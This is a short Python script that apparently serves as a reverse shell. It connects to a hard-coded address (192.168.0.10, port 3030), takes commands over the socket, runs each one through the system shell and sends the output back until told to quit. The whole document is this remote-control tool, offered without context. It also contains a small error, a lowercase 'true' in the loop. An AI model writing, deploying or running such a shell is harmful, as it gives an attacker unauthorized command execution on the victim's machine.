import socket, subprocess

TARGET_HOST = '192.168.0.10'
TARGET_PORT = 3030
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_HOST, TARGET_PORT))
s.send('Connected...')

while true:
    data = s.recv(1024)
    if data == 'quit' or data == 'exit': 
        break
    p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = p.stdout.read() + p.stderr.read()
    s.send(output)
    
s.close()